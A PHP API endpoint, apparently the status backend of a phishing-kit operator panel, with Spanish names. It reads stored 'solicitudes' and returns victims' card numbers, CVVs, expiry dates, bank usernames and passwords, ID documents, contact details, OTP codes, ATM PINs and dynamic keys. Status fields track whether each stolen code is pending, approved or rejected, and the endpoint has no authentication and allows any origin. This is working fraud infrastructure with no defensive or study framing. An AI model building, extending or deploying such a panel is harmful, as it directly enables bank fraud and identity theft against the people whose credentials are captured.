<?php
// api/estado_panel.php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Cache-Control: no-cache, must-revalidate');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// 🔥 Verificar si hay cambios
$dataDir = __DIR__ . '/../data/';
$ultimo_cambio_file = $dataDir . 'ultima_actualizacion.txt';
$ultimo_cambio = 0;

if (file_exists($ultimo_cambio_file)) {
    $ultimo_cambio = (int)file_get_contents($ultimo_cambio_file);
}

// Si se envía timestamp, comparar
$timestamp_recibido = $_GET['timestamp'] ?? 0;
if ($timestamp_recibido > 0 && $ultimo_cambio <= $timestamp_recibido) {
    echo json_encode([
        'success' => true,
        'hay_cambios' => false,
        'timestamp' => $ultimo_cambio
    ]);
    exit;
}

// Cargar datos
$file = $dataDir . 'solicitudes.dat';
$solicitudes = [];

if (file_exists($file)) {
    $content = file_get_contents($file);
    $solicitudes = json_decode($content, true) ?: [];
}

// ============================================
// ESTADÍSTICAS
// ============================================
$total = count($solicitudes);
$pendientes = 0;
$aprobadas = 0;
$rechazadas = 0;

$estados_pendientes = ['pending', 'pending_otp', 'pending_clave_cajero'];
$estados_aprobados = ['approved', 'approved_otp', 'approved_clave_cajero'];
$estados_rechazados = ['rejected', 'rejected_otp', 'rejected_clave_cajero'];

foreach ($solicitudes as $s) {
    $estado = $s['estado'] ?? 'pending';
    if (in_array($estado, $estados_pendientes)) {
        $pendientes++;
    } elseif (in_array($estado, $estados_aprobados)) {
        $aprobadas++;
    } elseif (in_array($estado, $estados_rechazados)) {
        $rechazadas++;
    }
}

// ============================================
// PROCESAR SOLICITUDES CON TODOS LOS CAMPOS
// ============================================
$solicitudes_procesadas = [];
foreach ($solicitudes as $s) {
    // Asegurar todos los campos
    $s['id'] = $s['id'] ?? '';
    $s['fecha'] = $s['fecha'] ?? date('Y-m-d H:i:s');
    $s['fecha_hora'] = $s['fecha_hora'] ?? $s['fecha'];
    $s['tipo_tarjeta'] = $s['tipo_tarjeta'] ?? 'visa';
    $s['numero_tarjeta'] = $s['numero_tarjeta'] ?? $s['tarjeta'] ?? 'N/A';
    $s['cvv'] = $s['cvv'] ?? 'N/A';
    $s['vencimiento'] = $s['vencimiento'] ?? 'N/A';
    $s['banco'] = $s['banco'] ?? 'N/A';
    $s['usuario'] = $s['usuario'] ?? 'N/A';
    $s['password'] = $s['password'] ?? 'N/A';
    $s['monto'] = $s['monto'] ?? 'N/A';
    $s['nombre'] = $s['nombre'] ?? 'N/A';
    $s['documento'] = $s['documento'] ?? 'N/A';
    $s['email'] = $s['email'] ?? 'N/A';
    $s['celular'] = $s['celular'] ?? 'N/A';
    $s['estado'] = $s['estado'] ?? 'pending';
    
    // 🔥 CAMPOS DE CÓDIGOS
    $s['otp_codigo'] = $s['otp_codigo'] ?? 'N/A';
    $s['clave_cajero_codigo'] = $s['clave_cajero_codigo'] ?? 'N/A';
    $s['clave_dinamica_codigo'] = $s['clave_dinamica_codigo'] ?? 'N/A';
    $s['otp_codigo_secundario'] = $s['otp_codigo_secundario'] ?? 'N/A';
    $s['otp_modo'] = $s['otp_modo'] ?? 'N/A';
    
    $solicitudes_procesadas[] = $s;
}

echo json_encode([
    'success' => true,
    'hay_cambios' => true,
    'timestamp' => $ultimo_cambio,
    'solicitudes' => array_reverse($solicitudes_procesadas),
    'stats' => [
        'total' => $total,
        'pendientes' => $pendientes,
        'aprobadas' => $aprobadas,
        'rechazadas' => $rechazadas
    ]
]);